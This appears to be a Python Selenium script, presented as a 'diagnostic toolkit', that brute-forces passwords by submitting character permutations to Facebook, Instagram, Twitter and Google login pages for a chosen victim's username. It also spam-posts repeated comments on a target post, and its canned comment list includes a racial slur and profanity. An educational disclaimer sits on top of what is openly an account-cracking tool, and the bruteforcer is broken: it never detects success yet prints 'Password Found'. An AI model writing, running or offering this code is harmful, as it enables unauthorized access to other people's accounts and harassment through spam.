

#Check the system arch to use corresponding chrome driver
import platform
if platform.system() == 'Windows':
	path_to_driver = 'chromedriver.exe'
else:
	path_to_driver = 'chromedriver'

'''
This script is for testing purposes only. It is not built with intention to harm any system or person's
private data. I built this only for educational purposes and to test my selenium skill. You are allowed to use it
wisely, remaining under the ethics and respecting others privacy. Do not use it for malicious purposes.
'''

#Check if selenium is installed or not if you are having problem using
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, InvalidArgumentException

#Check if chromedriver is installed or not if you're having problems


import itertools as it
import time
import string
import random

#Global Section
social_media_list = {
	1: ['facebook', 'https://m.facebook.com/login', 'email','pass'],
	2: ['instagram', 'https://www.instagram.com/accounts/login','username', 'password'],
	3: ['twitter', 'https://www.twitter.com/login', 'session[username_or_email]', 'session[password]'],
	4: ['google', 'https://accounts.google.com/','identifier','password'],
	}
choice = 0

def random_comments():
	return random.choice([
	'Haha! Good One.',
	'You can do it',
	'Shit',
	'Hello',
	'CutiePie',
	'Made by singularity',
	'all hail physics',
	'thanks',
	'i\'ll not stop, sorry',
	'good night',
	'good morning',
	'aae, you good?',
	'whass up mah nigga',
	'thanks',
	'thanks selenium',
	'ooh yeah',
	'good luck',
	'imma supa hot',
	'im not a rapper',
	'you got problems man?',
	'washing powder nirma',
	'munna bhai mbbs',
	'munni badnaam hui darlin tere liye',
	'butiful picture',
	'you need medication',
	'you high?',
	'leave at the tone',
	'watch vikings',
	'watch the big bang theory',
	'watch the expanse'
	])


def bruteforcer(possible_characters, browser,length):
	global choice, social_media_list

	#If the length is zero then
	if length == 0:
		temp_length = len(possible_characters)
	# else:
	# 	temp_length = length

	#Flag variable to break out of loop if finds the passcode
	found = False
	#Link Identification path for password box
	password_path = social_media_list.get(choice)[3]
	while True:
		try:
			for index in range(temp_length):
				if length == 0:
					temp = it.permutations(possible_characters,index)
				else:
					temp = it.permutations(possible_characters,length)
				for i in temp:
					pass1 = ''.join(i)
					print(pass1)

					#Checks to see if password matches
					#If its a login page Enter the password
					try:
						browser.find_element_by_name(password_path).send_keys(pass1)
						browser.find_element_by_name(password_path).submit()
					
					#Else it must be login help page...Skip it by pressing try again button
					except NoSuchElementException:
						try:
							browser.find_element_by_name('Try again').click()
						except NoSuchElementException:
							print("Page rejected password request")
					
					#Wait
					#time.sleep(3)
				if found == True:
					break
			if found == True:
				break
		#Breaks out of loop if index error arises ie all possible combinations have been tried
		except IndexError:
			print("Finished trying")
			break
	print('\n\nPassword Found\nPassword: {}'.format(pass1))

def commentor(path_to_page):
	
	#Input Section--------------------
	username = input("Enter your username...\n==>")
	password = input("\nEnter your password...\n==>")
	path_to_post = input("\nEnter the url of post you want to comment on...\n==>")

	while True:
		spam_length_flag = True
		try:
			comment_length = int(input("\nEnter how many times you want to spam comment...\n"))
		except ValueError:
			spam_length_flag = False
			print("\nInvalid Input... Enter Valid number\n")
		finally:
			if spam_length_flag == True:
				break
	given_comment = input("\nEnter a comment to post or enter 0 to post randomly generated comments\n")
	if given_comment == '0':
		random_comment_flag = True
	else:
		random_comment_flag = False


	link_to_comment_box = 'composerInput'
	
	#Open Browser
	browser = webdriver.Chrome()
	
	#Open Facebook Login Page
	browser.get(social_media_list.get(choice)[1])
	time.sleep(3)

	username_path = social_media_list.get(choice)[2]
	password_path = social_media_list.get(choice)[3]
	print(username_path, password_path)

	#Search for username and password fields by CSS method
	try:
		username_element = browser.find_element_by_name(username_path)
		password_element = browser.find_element_by_name(password_path)
	except NoSuchElementException:
		print("Something went wrong...Try again Later")
		return
	
	#Fill the given username and password
	username_element.send_keys(username)
	password_element.send_keys(password)

	#Submit the provided information
	username_element.submit()
	time.sleep(3)

	#Now Open the target post
	try:
		browser.get(path_to_post)
	except InvalidArgumentException:
		print("\nCannot open provided page...Check url or your login credentials and try again\n")
		return
	#Find the comment Box
	time.sleep(5)
	for i in range(comment_length):
		if random_comment_flag == True:
			given_comment = random_comments()
		try:
			#Fill the comment Box and Submit
				browser.find_element_by_id(link_to_comment_box).send_keys(given_comment)
				browser.find_element_by_id(link_to_comment_box).submit()
				time.sleep(2)
		except NoSuchElementException:
			print("Unable to Comment....")
			return


def bruteforce():
	
	#Link to element in webpage containing identification of username typing box
	username_path = social_media_list.get(choice)[2]
	
	username = input('\nEnter the username of the person to crack the password of...\n==>')
	given_data = []

	#Set the possible characters that make up the passcode
	while True:
		print("1) Include all lowercase alphabets\n2) Include all Uppercase Alphabets\n3) Include all numbers from 0-9\n4) Include all special symbols\n5) Include custom Characters")
		while True:
			try:
				flag = True
				option_choosen = int(input("\nEnter your choice\n==>"))
			except ValueError:
				flag = False
				print("\nInvalid Input. Enter Again....\n")
			finally:
				if flag == True and option_choosen >0  and option_choosen < 6:
					break
				print("\nEnter option from 1 and 5\n")
		given_data.append({
			1: [i for i in string.ascii_lowercase],
			2: [i for i in string.ascii_uppercase],
			3: [i for i in range(0,10)],
			4: [i for i in string.punctuation],
			5: lambda: input('Enter all characters you want to include.\n==>')
			}.get(option_choosen))

		print(given_data)
		done = input("Ready to Attack?(Y/N)\n=>")
		if done == 'Y' or done == 'y':
			break
	#While loop ends

	#convert list to string
	possible_characters = ''
	for i in given_data:
		for j in i:
			#if current element is an integer convert it to string
			if type(j) == int:
				j = str(j)
			possible_characters += j

	#Ask for possible passcode length
	#This loop will terminate only if stat is assigned False
	#For this the given input must have to be a numerical value
	#Otherwise the stat is going to get assigned False everytime the ValueError is thrown
	#Which is because of inability to convert invalid string input to integer
	while True:
		stat = True
		try:
			passcode_length = int(input(
'''
\nEnter the possible length of passcode. If you dont know, enter 0.
But it will take more time, maybe couple of years, to crack the passcode if all lengths have to be tried.
Bear with that...\n==>
'''
				))
		except ValueError:
			print("\nInvalid Input. Please enter numerical value...\n")
			stat = False
		finally:
			if stat == True:
				break
	
	#Open Browser
	browser = webdriver.Chrome(path_to_driver)
	
	#Open Facebook Login Page

	browser.get(social_media_list.get(choice)[1])
	time.sleep(3)
	browser.find_element_by_name(username_path).send_keys(username)
	browser.find_element_by_name(username_path).submit()

#I have to still create a bruteforce algorithm-------------------------------
	bruteforcer(possible_characters,browser,passcode_length)
#-------------------------------------------------------------------------
def first_menu():
	global choice
	chosen_flag = True
	print("----------------------Social Media Automated diagnostic Toolkit-----------------\n\n")
	print("1) Facebook\n2) Instagram\n3) Twitter\n4) Google\n5) Quora\n6) Reddit\n7)Exit\n")
	while True:
		try:
			#choice = social_media_list.get(input("Enter your choice below:"))
			choice = int(input("Enter choice\n==>"))
		except ValueError:
			chosen_flag = False
		finally:	
			if chosen_flag == True and choice > 0 and choice < 8:
				break
			print("\nInvalid Option Chosen...Choose Again...\n")


def social_medias_options():
	global social_media_list, choice
	
	while True:
		print("\n1) Social Media Commentor\n2) Social Media Password Bruteforce Attack\n3) Exit")
		choiceInternal = input("\nEnter your choice:\n==>")
		if choiceInternal == '1':
			commentor(input(social_media_list.get(choice)[1]))
			break
		elif choiceInternal == '2':
			bruteforce()			
			break
		elif choiceInternal == '3':
			__main__()
		else:
			print("Invalid Option Chosen")

if __name__ == '__main__':
	
	first_menu()
	social_medias_options()
